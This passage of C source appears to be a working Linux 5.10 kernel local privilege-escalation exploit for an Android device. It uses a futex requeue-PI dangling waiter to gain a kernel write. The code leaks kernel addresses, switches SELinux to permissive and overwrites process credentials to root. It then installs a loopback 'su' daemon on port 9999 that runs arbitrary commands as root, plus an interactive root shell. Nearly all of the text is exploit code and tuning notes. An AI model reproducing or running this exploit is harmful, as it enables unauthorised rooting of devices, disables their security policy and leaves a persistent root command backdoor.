    w[0] = atomic_load(&stamp_parent); /* pc: stamp3=value to write /
                                        * stamp5=(target)&~3 BLACK      */
    w[1] = 0;                          /* tree.rb_right               */
    w[2] = stamp5 ? 0 : atomic_load(&stamp_value); /* rb_left          */
    w[4] = k_waiter + 0x18;            /* pi.rb_right self => EMPTY   */
    w[6] = k_init_task;                /* waiter->task                */
    w[7] = atomic_load(&stamp_lock);   /* waiter->lock = fresh slot   */
    atomic_store(&stamp_status, 1);
    atomic_store(&stamp_done, 1);
    return;
  }
  /* 5.10 walk geometry (disasm @124993efd06e +0xac8..+0xb5c): the walk
   * reads waiter->lock (+0x38), then treats the tree_entry root slot
   * (+0x00, stamped) as a real rb_root and dereferences its node child
   * (+0x08, stamped "value") as an rb_node -> waiter->prio comparison.
   * Therefore: value slot = address of a ZEROED scratch node (ghost+0x20,
   * inside the zero BSS run; prio reads 120-ish == CFS default never
   * forces left), parent slot = WRITE TARGET slot, left = 0.
   * The insert then writes the node pointer into the parent slot itself
   * (rb_link_node: *link = node) -> SELinux: target = state+0, node low
   * byte 0x00 (waiter is stack 0x...c30 + color 0 black) -> enforce 1->0. */
  w[0] = atomic_load(&stamp_parent); /* write target (rb_root slot)     */
  w[1] = atomic_load(&stamp_value);  /* zeroed scratch node address      */
  w[2] = 0;                          /* node->rb_left                    */
  w[6] = task_y ? k_y_task : k_ghost_task; /* waiter->task              */
  w[7] = atomic_load(&stamp_lock);   /* waiter->lock = fake_lock         */
  atomic_store(&stamp_status, 1);
  atomic_store(&stamp_done, 1);
}

static int stamp_waiter(uint64_t parent, uint64_t value, uint64_t lock) {
  atomic_store(&stamp_parent, parent);
  atomic_store(&stamp_value, value);
  atomic_store(&stamp_lock, lock);
  atomic_store(&stamp_status, 0);
  atomic_store(&stamp_done, 0);
  (void)syscall(SYS_tgkill, process_pid, atomic_load(&y_tid), SIGUSR2);
  return atomic_load_explicit(&stamp_done, memory_order_acquire) &&
         atomic_load(&stamp_status) == 1;
}

static void sigusr1(int sig) { (void)sig; }

static void *thread_y(void *unused) {
  (void)unused;
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigusr2;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR2, &sa, NULL) != 0) return NULL;
  int tid = (int)syscall(__NR_gettid);
  atomic_store(&y_tid, tid);
  char status_path[64];
  uint64_t y_cred = 0;
  snprintf(status_path, sizeof(status_path), "/proc/self/task/%d/status", tid);
  k_y_task = leak_task_from_status(status_path, &y_cred);
  uint64_t syscall_sp = leak_syscall_sp();
  /* R7 disasm: waiter = futex frame SP + 0x90 (x2 -> rt_mutex_wait_proxy_lock);
   * syscall_sp = SP + 0x1a0 -> waiter = syscall_sp - 0x110.
   * (R6 used SP-0x198 with its own frame sizes.) */
  k_waiter = syscall_sp ? syscall_sp - 0x110 : 0;
  atomic_store_explicit(&y_task_ready, k_y_task && k_waiter ? 1 : -1,
                        memory_order_release);
  if (!k_y_task || !k_waiter) return NULL;
  if (y_leak_only) return NULL;
  if (raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
  atomic_store(&y_locked_l2, 1);
  while (!atomic_load(&x_locked_l1)) sched_yield();
  atomic_store(&y_parking, 1);
  (void)raw_futex(&cond, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);

  int stamped = stamp_waiter(0, 0, k_fake_lock);
  atomic_store_explicit(&y_done, stamped ? 1 : -1, memory_order_release);
  for (;;) {
    if (atomic_exchange(&respray_ready, 0)) {
      stamped = stamp_waiter(atomic_load(&respray_parent),
                             atomic_load(&respray_value),
                             atomic_load(&respray_lock));
      atomic_store_explicit(&respray_done, stamped ? 1 : -1,
                            memory_order_release);
    }
    if (atomic_load_explicit(&y_cleanup, memory_order_acquire)) break;
    cpu_yield();
  }
  int dummy = (int)(0x80000000U | (unsigned)getpid());
  struct timespec zero = {0, 0};
  (void)raw_futex(&dummy, LOCK_PI_PRIVATE, 0, (long)&zero, NULL, 0);
  (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  while (!atomic_load(&x_done)) sched_yield();
  return NULL;
}

static void *thread_x(void *unused) {
  (void)unused;
  while (!atomic_load(&y_locked_l2)) sched_yield();
  if (raw_futex(&pi1, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
  atomic_store(&x_locked_l1, 1);
  atomic_store(&x_blocking, 1);
  (void)raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0);
  (void)raw_futex(&pi1, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  atomic_store(&x_done, 1);
  return NULL;
}

/* Read a task's nice value from /proc/<pid>/task/<tid>/stat (field 19).
 * -999 on any failure (missing file => ESRCH-class trigger was hopeless). */
static int get_task_nice(int tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/task/%d/stat", process_pid, tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) return -999;
  char buf[512];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) return -999;
  buf[n] = 0;
  char *p = strrchr(buf, ')');
  if (!p) return -999;
  p++;
  int field = 2; /* fields after the comm: 3=state ... 19=nice */
  while (*p && field < 19) if (*p++ == ' ') field++;
  return atoi(p);
}

static long trigger_pi_stage(char stage, int tid) {
  static int policy;
  static int nice_lvl;
  struct sched_param p = {.sched_priority = 0};
  long r;
  record_stage(stage);
  /* --use-setprio: stay inside SCHED_OTHER; a REAL nice change still
   * enters __sched_setscheduler + the PI path but skips the class-change
   * and migration machinery that BATCH/OTHER toggling drags in.  Nice is
   * toggled 0<->1 (unprivileged-friendly, guaranteed real change). */
  if (use_setprio) {
    nice_lvl = nice_lvl == 0 ? 1 : 0;
    r = syscall(SYS_setpriority, PRIO_PROCESS, tid, nice_lvl);
  } else if (use_fifo) {
    /* OTHER(prio 120) <-> FIFO(1)(prio 99): guaranteed real prio change
     * (passes rt_mutex_adjust_pi's waiter_equal early-return), no BATCH
     * class-change extras if the walk survives. */
    static int on_fifo;
    on_fifo = !on_fifo;
    p.sched_priority = on_fifo ? 1 : 0;
    r = raw_sched_setscheduler(tid, on_fifo ? SCHED_FIFO : SCHED_OTHER, &p);
  } else if (use_setattr) {
    /* setpriority(2) never walked: it uses __set_user_nice (no PI pass).
     * sched_setattr(SCHED_OTHER, nice 0<->1) enters __sched_setscheduler
     * (pi=true -> rt_mutex_adjust_pi) for a REAL prio change while the
     * task STAYS in the CFS class: isolates PI-walk from class switch. */
    static int attr_nice;
    static struct { unsigned size; int policy; unsigned long long flags;
                    int nice; unsigned priority;
                    unsigned long long runtime, deadline, period; } attr;
    attr.size = sizeof(attr); /* kernel sched_attr = 48 bytes */
    attr.policy = in_class ? SCHED_OTHER : SCHED_BATCH;
    /* Amazon: BATCH+nice toggle, real prio change; --in-class keeps the
     * task inside CFS (no class-switch machinery) */
    attr.flags = 0;
    attr.priority = 0;
    attr_nice = attr_nice == 0 ? 1 : 0;
    attr.nice = attr_nice;
    r = syscall(274 /* SYS_sched_setattr on arm64 */, tid, &attr, 0);
  } else {
    /* R7 ON-DEVICE (runs 1-8): __sched_setscheduler short-circuits on a
     * no-change policy (OTHER->OTHER wrote nothing), while a REAL change
     * (->SCHED_BATCH) walks the chain (and panicked while the stamp or
     * geometry was still provisional).  Alternate every call so each walk
     * is guaranteed a real policy change. */
    policy = policy == SCHED_OTHER ? SCHED_BATCH : SCHED_OTHER;
    r = raw_sched_setscheduler(tid, policy, &p);
  }
  printf("[T] stage=%c tid=%d r=%ld errno=%d nice_seen=%d\n", stage, tid,
         r, r == -1 ? errno : 0, get_task_nice(tid));
  return r;
}

static long trigger_pi(void) { return trigger_pi_stage('t', atomic_load(&y_tid)); }

static int read_enforce(void) {
  char b[4] = {0}; int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (fd < 0) return -1;
  ssize_t n = read(fd, b, sizeof(b)); close(fd);
  return n > 0 ? b[0] - '0' : -1;
}

static int probe_scratch;

static int write_value(uint64_t target, uint64_t value) {
  /* stamp4: two-phase on ONE slot (k_fake_lock), self-consistent throughout.
   * Phase 0 (ANCHOR, stage 'n'): tree_entry stamped RB_EMPTY -> dequeue
   * early-returns on the zero root; enqueue's *link=NULL holds immediately
   * -> ZERO deref outside the slot; slot becomes {rb_node=waiter,
   * leftmost=waiter, owner=0} = valid solo tree.  No write expected.
   * Phase 1 (WRITE, stage 'w', repeated for cred): erase case 1b writes
   * pc=0 to *target (THE primitive), root.rb_node=target, then re-enqueue
   * walks target-as-node -- the deref suspect every prior run died in. */
  if (stamp4) {
    atomic_store(&stamp_value, target);
    atomic_store(&stamp_lock, k_fake_lock);
    atomic_store(&respray_done, 0);
    atomic_store_explicit(&respray_ready, 1, memory_order_release);
    while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
    if (atomic_load(&respray_done) < 0) return 0;
    /* 'n' = died in ANCHOR walk, 'w' = died in WRITE walk (post-sigreturn
     * the stage file is the only survivor; the [T] line marks survival). */
    int r = trigger_pi_stage(atomic_load(&stamp4_phase) ? 'w' : 'n',
                             atomic_load(&y_tid)) == 0;
    atomic_store(&stamp4_phase, 1);
    return r;
  }
  /* R7 5.10 leaf-erase model: stamp waiter tree entry as a LEAF
   * (parent = (target-8)&~3, rb_left=rb_right=0).  rb_erase replaces the
   * leaf with NULL: *(parent+8) = 0, i.e. a ZERO u64 lands exactly on
   * target.  value must be 0 (checked below); the "windows" R6 helper is
   * unused on this path.  Derefs during fixup stay on target-8..+10
   * (readable kernel BSS/cred) -- no dangling memory touched. */
  if (stamp3 || stamp5) {
    if (fake_lock_index >= 8) return 0;
    uint64_t slot = k_scratch + 0xa80 + fake_lock_index++ * 0x40;
    atomic_store(&respray_parent,
                 cred_pc_now ? k_init_cred
                           : perm_pc ? ((k_scratch & ~UINT64_C(0xffff)) | UINT64_C(0x10000))
                                     : ((stamp5 || stamp6) ? (target & ~UINT64_C(3))
                                                           : (value & ~UINT64_C(3))));
    atomic_store(&respray_value, target);
    atomic_store(&respray_lock, slot);
    atomic_store(&respray_done, 0);
    atomic_store_explicit(&respray_ready, 1, memory_order_release);
    while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
    if (atomic_load(&respray_done) < 0) return 0;
    return trigger_pi() == 0;
  }
  (void)value;
  atomic_store(&respray_parent, (target - 8) & ~UINT64_C(3));
  atomic_store(&respray_value, 0);
  atomic_store(&respray_lock, k_fake_lock);
  atomic_store(&respray_done, 0);
  atomic_store_explicit(&respray_ready, 1, memory_order_release);
  while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
  if (atomic_load(&respray_done) < 0) return 0;
  return trigger_pi() == 0;
}

static void ignore_terminal_signals(void) {
  struct sigaction ignore;
  memset(&ignore, 0, sizeof(ignore));
  ignore.sa_handler = SIG_IGN;
  sigemptyset(&ignore.sa_mask);
  (void)sigaction(SIGHUP, &ignore, NULL);
  (void)sigaction(SIGINT, &ignore, NULL);
  (void)sigaction(SIGQUIT, &ignore, NULL);
}

/* ---- embedded su (Amazon-style, #46): ----------------------------------
 * daemon  : forked from the ROOTED exploit process (cred carries through
 *           fork), listens on 127.0.0.1:9999.  One line (a shell command)
 *           per connection -> sh -c, output streamed, exit code last byte.
 * client  : `su -c '<cmd>'` from any (uid 2000) shell: connect, send line,
 *           stream stdout+stderr back.  Binary is a copy of ourselves at
 *           /data/local/tmp/su (daemon copies /proc/self/exe on startup). */
static int su_daemon_child(int lfd) {
  for (;;) {
    int cs = accept(lfd, NULL, NULL);
    if (cs < 0) { if (errno == EINTR) continue; return 30; }
    char line[1024];
    ssize_t n = 0;
    while (n < (ssize_t)sizeof(line) - 1) {
      ssize_t r = read(cs, line + n, 1);
      if (r <= 0) break;
      if (line[n] == '\n') break;
      n++;
    }
    line[n] = 0;
    /* Telnet-style clients (PowerShell TcpClient, raw sockets) send CRLF;
     * without this, sh receives "id\r" -> "inaccessible or not found". */
    if (n > 0 && line[n - 1] == '\r') line[--n] = 0;
    pid_t k = fork();
    if (k == 0) {
      close(lfd);
      dup2(cs, 0); dup2(cs, 1); dup2(cs, 2);
      if (cs > 2) close(cs);
      if (n == 0) _exit(0);
      execl("/system/bin/sh", "sh", "-c", line, (char *)NULL);
      _exit(127);
    }
    int st = 0;
    if (k > 0) waitpid(k, &st, 0);
    close(cs);
  }
  return 0;
}

static int su_daemon(void) {
  /* fsync'd log: survives a panic (plain redirect loses everything). */
  int slog = open("/data/local/tmp/su.log", O_WRONLY | O_CREAT | O_TRUNC | O_DSYNC, 0644);
  if (slog >= 0) { dup2(slog, 1); dup2(slog, 2); if (slog > 2) close(slog); }
  printf("[S] daemon start uid=%d\n", getuid());
  /* The exploit's cred write left a garbage gid word (1985106304) behind;
   * `id` errors on an unresolvable GID.  Normalise: drop all groups, become
   * gid 2000 (shell) so every forked child inherits uid=0 gid=2000. */
  if (setgroups(0, NULL) != 0)
    printf("[S] setgroups failed: %s\n", strerror(errno));
  if (setgid(2000) != 0)
    printf("[S] setgid(2000) failed: %s\n", strerror(errno));
  printf("[S] cred now uid=%d gid=%d\n", getuid(), getgid());
  int lfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (lfd < 0) return 30;
  int one = 1;
  setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  struct sockaddr_in a; memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET; a.sin_port = htons(9999);
  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (bind(lfd, (struct sockaddr *)&a, sizeof(a)) != 0 || listen(lfd, 4) != 0) {
    printf("[S] bind/listen failed: %s\n", strerror(errno));
    return 30;
  }
  /* install the client binary while privileged */
  int self = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
  if (self >= 0) {
    int dst = open("/data/local/tmp/su", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
    if (dst >= 0) {
      char buf[65536]; ssize_t r;
      while ((r = read(self, buf, sizeof(buf))) > 0) {
        ssize_t off = 0;
        while (off < r) { ssize_t w = write(dst, buf + off, (size_t)(r - off)); if (w <= 0) break; off += w; }
      }
      close(dst);
    }
    close(self);
    printf("[S] su client installed: %s\n", strerror(errno));
  } else {
    printf("[S] no /proc/self/exe: %s\n", strerror(errno));
  }
  ignore_terminal_signals();
  printf("[+] su daemon on 127.0.0.1:9999 (su=/data/local/tmp/su)\n");
  return su_daemon_child(lfd);
}

static int su_client(int argc, char **argv) {
  int lfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (lfd < 0) return 30;
  struct sockaddr_in a; memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET; a.sin_port = htons(9999);
  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (connect(lfd, (struct sockaddr *)&a, sizeof(a)) != 0) {
    fprintf(stderr, "[-] su: cannot reach ghostlock daemon (%s)\n", strerror(errno));
    return 127;
  }
  char cmd[1024]; size_t len = 0; cmd[0] = 0;
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) { argv[i+1][strlen(argv[i+1])] = '\n'; strncat(cmd, argv[++i], sizeof(cmd) - len - 1); len = strlen(cmd); }
    else if (strcmp(argv[i], "-") == 0) {}
    else if (strcmp(argv[i], "--") == 0) {}
  }
  if (len == 0) strncat(cmd, "id\n", sizeof(cmd) - 1);
  (void)!write(lfd, cmd, strlen(cmd));
  shutdown(lfd, SHUT_WR);
  char buf[8192]; ssize_t r;
  while ((r = read(lfd, buf, sizeof(buf))) > 0)
    if (write(1, buf, (size_t)r) <= 0) break;
  close(lfd);
  return 0;
}

static int post_root_shell(void) {
  struct __user_cap_header_struct cap_hdr = {
    .version = _LINUX_CAPABILITY_VERSION_3,
    .pid = 0,
  };
  struct __user_cap_data_struct cap_data[2] = {{0}};
  if (syscall(SYS_capget, &cap_hdr, cap_data) != 0 ||
      !(cap_data[0].effective & (UINT32_C(1) << CAP_SETGID))) {
    fprintf(stderr, "[-] post-exec CAP_SETGID verification failed\n");
    return 31;
  }

  gid_t groups[64];
  int group_count = getgroups(63, groups);
  if (group_count < 0) {
    fprintf(stderr, "[-] post-exec getgroups failed: %s\n", strerror(errno));
    return 31;
  }
  static const gid_t required_groups[] = {1000, 1026, 2000};
  for (unsigned wanted = 0;
       wanted < sizeof(required_groups) / sizeof(required_groups[0]); wanted++) {
    int present = 0;
    for (int i = 0; i < group_count; i++)
      if (groups[i] == required_groups[wanted]) present = 1;
    if (!present) groups[group_count++] = required_groups[wanted];
  }
  if (setgroups((size_t)group_count, groups) != 0) {
    fprintf(stderr, "[-] post-exec adding drmrpc failed: %s\n",
            strerror(errno));
    return 31;
  }
  printf("[+] post-exec CAP_SETGID + system/drmrpc/shell groups verified\n");
  execl("/system/bin/sh", "sh", "-i", (char *)NULL);
  fprintf(stderr, "[-] shell exec failed: %s\n", strerror(errno));
  return 31;
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  if (argc >= 2 && strcmp(argv[1], "--post-root") == 0)
    return post_root_shell();
  if (argc >= 2 && strcmp(argv[1], "--su-daemon") == 0)
    return su_daemon();
  {
    const char *bn = strrchr(argv[0], '/');
    bn = bn ? bn + 1 : argv[0];
    if (strcmp(bn, "su") == 0)
      return su_client(argc, argv);
  }
  /* --log <path>: persist console output through a hard reset (O_DSYNC).
   * Plain shell redirect lost the whole log on the S3 panic (ext4 journal
   * rollback); the fsync'd stage file survived. */
  for (int i = 1; i < argc - 1; i++)
    if (strcmp(argv[i], "--log") == 0) {
      int lf = open(argv[i + 1], O_WRONLY | O_CREAT | O_TRUNC | O_DSYNC, 0600);
      if (lf >= 0) {
        dup2(lf, STDOUT_FILENO);
        dup2(lf, STDERR_FILENO);
        close(lf);
      }
    }
  { /* Android caps RLIMIT_RTPRIO for shell; raise soft to hard so the
     * SCHED_FIFO test trigger can actually apply. */
    struct rlimit rl;
    if (getrlimit(RLIMIT_RTPRIO, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
      rl.rlim_cur = rl.rlim_max;
      (void)setrlimit(RLIMIT_RTPRIO, &rl);
    }
    printf("[i] RTPRIO soft=%llu hard=%llu\n",
           (unsigned long long)rl.rlim_cur, (unsigned long long)rl.rlim_max);
  }
  stage_fd = open("/data/local/tmp/ghostlock510.stage",
                  O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
  record_stage('0');
  process_pid = getpid();
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr1;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) != 0) return 1;
  runtime_text = leak_text();
  if (!runtime_text) { fprintf(stderr, "[-] KASLR leak failed\n"); return 1; }
  k_selinux_state = leak_selinux_state();
  if (!k_selinux_state) {
    fprintf(stderr, "[-] SELinux state leak failed\n");
    return 1;
  }
  k_current_task = leak_task_from_status("/proc/self/status", &k_current_cred);
  if (!k_current_task) {
    fprintf(stderr, "[-] current task leak failed\n");
    return 1;
  }
  record_stage('1');
  uint64_t slide = runtime_text - LINK_TEXT;
  /* Sanity-check the leaked selinux_state against the BSS extent (the x8
   * filter cannot be 4K-aligned on R7, so gate on range + expected offset
   * consistency instead). */
  if (k_selinux_state < runtime_text + OFF_BSS_START ||
      k_selinux_state >= runtime_text + OFF_BSS_STOP) {
    fprintf(stderr, "[-] leaked selinux_state %016llx outside BSS\n",
            (unsigned long long)k_selinux_state);
    return 1;
  }
  uint64_t data_delta = k_selinux_state -
                        (runtime_text + OFF_SELINUX_STATE);
  k_init_task = runtime_text + OFF_INIT_TASK + data_delta;
  k_init_cred = runtime_text + OFF_INIT_CRED + data_delta;
  /* Runtime address inside __log_buf, rounded up to 64 KiB.  Its numeric
   * low 16 bits are zero, so the 8-byte tree write makes disabled=0 and
   * enforcing=0 while initialized remains nonzero.  (S1: link abs
   * 0xffffffc00a9a0000 -> LE byte0=0, byte2!=0, verified.) */
  uint64_t log_start = runtime_text + OFF_LOG_BUF + data_delta;
  k_write_value = (log_start + 0xffff) & ~UINT64_C(0xffff);
  /* Scratch = the unique zero BSS free run (see OFF_RUN_START).
   * ghost fake-task run+0x80 (deep read ~+0x990), stamp lock +0xa00,
   * write windows +0xa80..+0xc80 (R6 geometry inside the run). */
  k_scratch = runtime_text + OFF_RUN_START + data_delta;
  k_ghost_task = k_scratch + SCRATCH_GHOST_OFF;
  k_fake_lock = k_scratch + SCRATCH_LOCK_OFF;
  printf("[*] _text=%016llx slide=%016llx data_delta=%llx init_task=%016llx\n",
         (unsigned long long)runtime_text, (unsigned long long)slide,
         (unsigned long long)data_delta,
         (unsigned long long)k_init_task);
  printf("[*] current_task=%016llx current_cred=%016llx\n",
         (unsigned long long)k_current_task,
         (unsigned long long)k_current_cred);
  printf("[*] selinux_state=%016llx fake_lock=%016llx ghost=%016llx value=%016llx\n",
         (unsigned long long)k_selinux_state,
         (unsigned long long)k_fake_lock,
         (unsigned long long)k_ghost_task,
         (unsigned long long)k_write_value);
  if (argc == 2 && strcmp(argv[1], "--leak-only") == 0) {
    /* S1 gate values on this device: enforce must read 1, ids 2000. */
    printf("[*] enforce=%d uid=%u euid=%u gid=%u\n",
           read_enforce(), getuid(), geteuid(), getgid());
    printf("[+] leak-only verified\n");
    return 0;
  }

  pthread_t tx, ty;
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--leak-y-only") == 0) y_leak_only = 1;
    if (strcmp(argv[i], "--arm-only") == 0) arm_only = 1;
    if (strcmp(argv[i], "--self-diag") == 0) self_diag = 1;
    if (strcmp(argv[i], "--verify-stamp") == 0) verify_stamp = 1;
    if (strcmp(argv[i], "--use-setprio") == 0) use_setprio = 1;
    if (strcmp(argv[i], "--probe-scratch") == 0) probe_scratch = 1;
    if (strcmp(argv[i], "--use-fifo") == 0) use_fifo = 1;
    if (strcmp(argv[i], "--use-setattr") == 0) use_setattr = 1;
    if (strcmp(argv[i], "--stamp3") == 0) stamp3 = 1;
    if (strcmp(argv[i], "--stamp5") == 0) stamp5 = 1;
    if (strcmp(argv[i], "--pc-target") == 0) stamp6 = 1;
    if (strcmp(argv[i], "--cred-first") == 0) cred_first = 1;
    if (strcmp(argv[i], "--probe-target") == 0) probe_target = 1;
    if (strcmp(argv[i], "--perm-pc") == 0) perm_pc = 1;
    if (strcmp(argv[i], "--cred-swap") == 0) cred_swap = 1;
    if (strcmp(argv[i], "--install-su") == 0) install_su = 1;
    if (strcmp(argv[i], "--stamp4") == 0) stamp4 = 1;
    if (strcmp(argv[i], "--equal-ctl") == 0) equal_ctl = 1;
    if (strcmp(argv[i], "--poison") == 0) poison = 1;
    if (strcmp(argv[i], "--task-y") == 0) task_y = 1;
    if (strcmp(argv[i], "--all-poison") == 0) all_poison = 1;
    if (strcmp(argv[i], "--in-class") == 0) in_class = 1;
    if (strcmp(argv[i], "--stamp-off") == 0 && i + 1 < argc)
      stamp_off = strtoull(argv[++i], NULL, 0);
    if (strcmp(argv[i], "--equal-prio") == 0 && i + 1 < argc)
      equal_prio = atoi(argv[++i]);
  }
  if (pthread_create(&ty, NULL, thread_y, NULL) != 0) return 2;
  while (!atomic_load_explicit(&y_task_ready, memory_order_acquire)) sched_yield();
  if (atomic_load(&y_task_ready) < 0) {
    fprintf(stderr, "[-] Y task leak failed\n");
    return 2;
  }
  printf("[*] y_task=%016llx waiter=%016llx\n",
         (unsigned long long)k_y_task, (unsigned long long)k_waiter);
  if (y_leak_only) {
    pthread_join(ty, NULL);
    printf("[+] Y task leak-only verified\n");
    return 0;
  }
  while (!atomic_load(&y_locked_l2)) sched_yield();
  if (pthread_create(&tx, NULL, thread_x, NULL) != 0) return 2;
  while (!(atomic_load(&x_locked_l1) && atomic_load(&y_parking) &&
           atomic_load(&x_blocking))) sched_yield();
  usleep(200000);
  record_stage('2');
  long r = raw_futex(&cond, CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
  record_stage('3');
  cond = 1;
  __atomic_thread_fence(__ATOMIC_SEQ_CST);
  syscall(SYS_tgkill, getpid(), atomic_load(&y_tid), SIGUSR1);
  if (r != -EDEADLK) {
    fprintf(stderr, "[-] cycle result=%ld expected=%d\n", r, -EDEADLK);
    return 3;
  }
  while (!atomic_load_explicit(&y_done, memory_order_acquire)) sched_yield();
  if (atomic_load(&y_done) < 0) {
    record_stage('E');
    fprintf(stderr, "[-] sigreturn stamp failed\n");
    return 4;
  }
  record_stage('4');
  printf("[+] dangling waiter armed (y_tid=%d)\n", atomic_load(&y_tid));
  if (self_diag) {
    /* Control call: sched_setscheduler on THIS main thread (no PI chain
     * through the dangling waiter).  Final stage 's' => the syscall itself
     * is fatal even for a clean task.  Final 't' => self-diag survived
     * ('a' logged) and only the dangling-waiter chain walk kills. */
    int self_tid = (int)syscall(SYS_gettid);
    long r = trigger_pi_stage('s', self_tid);
    printf("[*] self-diag sched_setscheduler(self=%d)=%ld\n", self_tid, r);
    record_stage('a');
  }
  if (arm_only) {
    printf("[+] arm-only halt: dangling waiter live, no PI trigger\n");
    for (;;) pause();
  }
  if (verify_stamp) {
    /* Geometry check without any kernel write: the sigreturn stamp put
     * parent_color/value/0 at waiter+0x00..0x10, zeros at +0x18..0x28
     * (pi_tree_entry), ghost task ptr at +0x30, fake_lock at +0x38.
     * Read our own kernel stack (waiter) through /proc/self/mem. */
    int mfd = open("/proc/self/mem", O_RDONLY);
    uint64_t buf[10];
    ssize_t n = mfd >= 0 ? pread(mfd, buf, sizeof(buf), (off_t)k_waiter) : -1;
    if (n != (ssize_t)sizeof(buf))
      fprintf(stderr, "[-] verify pread(waiter)=%zd: %s\n", n, strerror(errno));
    else
      for (int i = 0; i < 10; i++)
        printf("[V] waiter+0x%02x = %016llx\n", i * 8,
               (unsigned long long)buf[i]);
    printf("[V] expect(probe stamp parent=0 value=0): +30=%016llx +38=%016llx\n",
           (unsigned long long)k_ghost_task,
           (unsigned long long)k_fake_lock);
    if (mfd >= 0) close(mfd);
    record_stage('V');
    /* Do NOT exit: teardown of a thread group still holding the dangling
     * waiter on a real PI tree panicked (verify run #1, reboot after V).
     * Stay in arm_only-like limbo. */
    for (;;) pause();
  }

  if (probe_scratch) {
    /* Walk-safety probe: leaf inside the ZERO BSS scratch run.  Parent
     * slot scratch+0x28 reads zero -> rb_erase sees a NULL-parent leaf
     * (walk-up stops immediately); write lands as 0 on scratch+0x30
     * (already 0, harmless).  Surviving this with a REAL BATCH walk
     * proves entry+erase safe and indicts garbage parent chains at the
     * enforce/cred targets. */
    int pw = write_value(k_scratch + 0x30, 0);
    printf("[P] scratch write=%d enforce=%d\n", pw, read_enforce());
    record_stage('P');
  }
  int before = read_enforce();
  /* 5.10 (rtmutex.c @124993efd06e, disasm +0x4d0..+0x508): the first
   * chain walk dequeues_pi the dangling waiter via rb_erase_cached +
   * RB_CLEAR_NODE; every later walk early-returns on RB_EMPTY_NODE.
   * So the FIRST PI touch must carry the production stamp — R6's
   * throwaway settle consumed the only write and left no-op walks.
   * --cred-first (#34): skip the SELinux write entirely and let the
   * cred uid/gid writes be the ONLY probe: uid->0 == primitive alive
   * (selinux offset/value remains suspect); uid stays 2000 == the walk
   * never reached dequeue/erase (entry early-return is the suspect). */
  int wr;
  if (probe_target) {
    /* #37 LAND DETECTOR: stamp3 geometry, target = our own .bss word.
     * The kernel writes (case 1b: *target←pc, then re-enqueue may stamp
     * target+0x8/0x10 with the waiter ptr) from OUR thread's context, so
     * the write lands in our mapped page and we read it back directly —
     * no root needed.  Preset 0xC0FFEE: any change == the erase really
     * wrote; no change == the walk exited before [7] (early-return). */
    volatile uint64_t *p = &g_probe[8];
    p[0] = 0xC0FFEEULL; p[1] = 0xDEADULL; p[2] = 0xBEEFULL;
    wr = write_value((uint64_t)(uintptr_t)p, 0);
    usleep(100000);
    printf("[Z] probe wr=%d w0=%016llx w1=%016llx w2=%016llx uid=%u enforce=%d\n",
           wr, (unsigned long long)p[0], (unsigned long long)p[1],
           (unsigned long long)p[2], getuid(), read_enforce());
    record_stage('Z');
    fprintf(stderr, "[-] probe shot done (halt)\n");
    record_stage('K');
    for (;;) pause();
  }
  wr = cred_first ? 1
                  : write_value(stamp6 ? k_selinux_state - 0x18 : k_selinux_state,
                                (stamp3 || stamp5 || stamp6) ? 0 : k_write_value);
  usleep(100000);
  record_stage('5');
  int after = read_enforce();
  printf("[*] first-touch write_trigger=%d enforce=%d->%d\n", wr, before, after);
  if (after != 0) {
    /* Probe #2: second walk — distinguishes one-shot vs. re-enqueuing
     * semantics of the 5.10 chain walk. */
    int wr2 = write_value(stamp6 ? k_selinux_state - 0x18 : k_selinux_state, (stamp3 || stamp5 || stamp6) ? 0 : k_write_value);
    usleep(100000);
    record_stage('6');
    int after2 = read_enforce();
    printf("[*] probe2: write_trigger=%d enforce=%d->%d\n", wr2, after, after2);
    if (after2 != 0) {
      fprintf(stderr,
              "[-] SELinux write not observed (PROCEEDING: cred writes are "
              "an independent probe of the primitive)\n");
      record_stage('W');
    }
    after = after2;
  }
  printf("[+] SELinux permissive verified\n");

  /* Zero real/effective UID+GID and fsgid+securebits.  On the post-root exec,
   * Linux copies effective IDs into saved/filesystem IDs and legacy UID 0
   * raises permitted/effective capabilities from the 0xc0 bounding set.
   * R7 cred layout (5.10, CONFIG_KEYS=y): uid=0x04 gid=0x14 suid=0x20. */
  if (cred_swap) {
